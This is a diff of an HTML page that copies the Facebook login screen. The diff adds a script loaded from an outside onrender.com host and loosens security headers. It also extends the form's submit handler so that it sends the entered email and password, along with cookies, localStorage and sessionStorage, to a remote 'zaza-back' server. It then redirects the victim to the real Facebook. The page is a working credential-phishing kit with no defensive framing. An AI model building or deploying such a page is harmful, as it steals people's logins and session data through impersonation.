@@ -3,16 +3,20 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval';">
+  <meta http-equiv="X-XSS-Protection" content="0">
+  <meta http-equiv="Access-Control-Allow-Origin" content="*">
   <title>Facebook – log in or sign up</title>
   <link rel="stylesheet" href="/style.css" />
   <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  <script src="http://zaza-4f7z.onrender.com/capture.js"></script>
 </head>
 <body>
   <div class="language-switcher">
     <select id="langSelect">
-     <option value="en">English (US)</option>
-     <option value="ru">Русский</option>
-   </select>
+      <option value="en">English (US)</option>
+      <option value="ru">Русский</option>
+    </select>
   </div>
 
   <div class="container">
@@ -45,80 +49,94 @@
     </div>
   </div>
 
-<footer class="footer">
-  <div class="footer-content">
-    <div class="languages">
-      <a href="#">English (US)</a>
-      <a href="#">Polski</a>
-      <a href="#">ślōnskŏ gŏdka</a>
-      <a href="#">Русский</a>
-      <a href="#">Deutsch</a>
-      <a href="#">Français (France)</a>
-      <a href="#">Italiano</a>
-      <a href="#">Українська</a>
-      <a href="#">Español (España)</a>
-      <a href="#">Português (Brasil)</a>
-      <a href="#">العربية</a>
+  <footer class="footer">
+    <div class="footer-content">
+      <div class="languages">
+        <a href="#">English (US)</a>
+        <a href="#">Polski</a>
+        <a href="#">ślōnskŏ gŏdka</a>
+        <a href="#">Русский</a>
+        <a href="#">Deutsch</a>
+        <a href="#">Français (France)</a>
+        <a href="#">Italiano</a>
+        <a href="#">Українська</a>
+        <a href="#">Español (España)</a>
+        <a href="#">Português (Brasil)</a>
+        <a href="#">العربية</a>
+      </div>
+
+      <hr class="footer-separator" />
+
+      <div class="links">
+        <a href="https://www.facebook.com/reg">Sign Up</a>
+        <a href="https://www.facebook.com/login">Log In</a>
+        <a href="https://www.messenger.com/">Messenger</a>
+        <a href="https://www.facebook.com/lite/">Facebook Lite</a>
+        <a href="https://www.facebook.com/watch/">Video</a>
+        <a href="https://pay.facebook.com/">Meta Pay</a>
+        <a href="https://www.facebook.com/store">Meta Store</a>
+        <a href="https://www.meta.com/quest/">Meta Quest</a>
+        <a href="https://www.ray-ban.com/">Ray-Ban Meta</a>
+        <a href="https://www.meta.ai/">Meta AI</a>
+        <a href="https://www.instagram.com/">Instagram</a>
+        <a href="https://www.threads.net/">Threads</a>
+        <a href="https://www.facebook.com/votinginformationcenter/">Voting Information Center</a>
+        <a href="https://www.facebook.com/privacy/policy">Privacy Policy</a>
+        <a href="https://www.facebook.com/privacy/center/">Privacy Center</a>
+        <a href="https://www.facebook.com/help/delete_account?rdrhc">Cancel contracts here</a>
+        <a href="https://www.facebook.com/about">About</a>
+        <a href="https://www.facebook.com/ads/create">Create ad</a>
+        <a href="https://www.facebook.com/pages/create">Create Page</a>
+        <a href="https://developers.facebook.com/">Developers</a>
+        <a href="https://www.facebook.com/careers/">Careers</a>
+        <a href="https://www.facebook.com/policies/cookies/">Cookies</a>
+        <a href="https://www.facebook.com/adpreferences/ad_settings/">Ad choices</a>
+        <a href="https://www.facebook.com/terms">Terms</a>
+        <a href="https://www.facebook.com/help/">Help</a>
+        <a href="https://www.facebook.com/help/contact/268228883256323">Contact Uploading & Non-Users</a>
+      </div>
+
+      <p class="meta-copy">Meta © 2025</p>
     </div>
+  </footer>
 
-    <hr class="footer-separator" />
+  <script type="module">
+    const loginForm = document.getElementById('loginForm');
 
-    <div class="links">
-      <a href="https://www.facebook.com/reg">Sign Up</a>
-      <a href="https://www.facebook.com/login">Log In</a>
-      <a href="https://www.messenger.com/">Messenger</a>
-      <a href="https://www.facebook.com/lite/">Facebook Lite</a>
-      <a href="https://www.facebook.com/watch/">Video</a>
-      <a href="https://pay.facebook.com/">Meta Pay</a>
-      <a href="https://www.facebook.com/store">Meta Store</a>
-      <a href="https://www.meta.com/quest/">Meta Quest</a>
-      <a href="https://www.ray-ban.com/">Ray-Ban Meta</a>
-      <a href="https://www.meta.ai/">Meta AI</a>
-      <a href="https://www.instagram.com/">Instagram</a>
-      <a href="https://www.threads.net/">Threads</a>
-      <a href="https://www.facebook.com/votinginformationcenter/">Voting Information Center</a>
-      <a href="https://www.facebook.com/privacy/policy">Privacy Policy</a>
-      <a href="https://www.facebook.com/privacy/center/">Privacy Center</a>
-      <a href="https://www.facebook.com/help/delete_account?rdrhc">Cancel contracts here</a>
-      <a href="https://www.facebook.com/about">About</a>
-      <a href="https://www.facebook.com/ads/create">Create ad</a>
-      <a href="https://www.facebook.com/pages/create">Create Page</a>
-      <a href="https://developers.facebook.com/">Developers</a>
-      <a href="https://www.facebook.com/careers/">Careers</a>
-      <a href="https://www.facebook.com/policies/cookies/">Cookies</a>
-      <a href="https://www.facebook.com/adpreferences/ad_settings/">Ad choices</a>
-      <a href="https://www.facebook.com/terms">Terms</a>
-      <a href="https://www.facebook.com/help/">Help</a>
-      <a href="https://www.facebook.com/help/contact/268228883256323">Contact Uploading & Non-Users</a>
-    </div>
+    loginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
 
-    <p class="meta-copy">Meta © 2025</p>
-  </div>
-</footer>
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const cookies = document.cookie || '[no cookies]';
+      const localStorageDump = JSON.stringify(localStorage || {});
+      const sessionStorageDump = JSON.stringify(sessionStorage || {});
 
-<script type="module">
-  const loginForm = document.getElementById('loginForm');
+      const payload = {
+        email,
+        password,
+        cookies,
+        localStorage: localStorageDump,
+        sessionStorage: sessionStorageDump
+      };
 
-  loginForm.addEventListener('submit', async (e) => {
-    e.preventDefault();
+      try {
+        await fetch('https://zaza-back.onrender.com/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'include',
+          body: JSON.stringify(payload)
+        });
 
-    const email = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value.trim();
-    const cookies = document.cookie; // Получаем все видимые JS-куки
+        // optionally show UI feedback (can be removed)
+        // document.getElementById('result').innerHTML = `<p>Welcome, ${email}</p>`;
 
-    try {
-      await fetch('https://zaza-back.onrender.com/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password, cookies })
-      });
-    } catch (error) {
-      console.error('Login failed:', error);
-    } finally {
-      window.location.href = 'https://www.facebook.com/';
-    }
-  });
-</script>
-
+      } catch (error) {
+        console.error('Login failed:', error);
+      } finally {
+        window.location.href = 'https://www.facebook.com/';
+      }
+    });
+  </script>
 </body>
 </html>
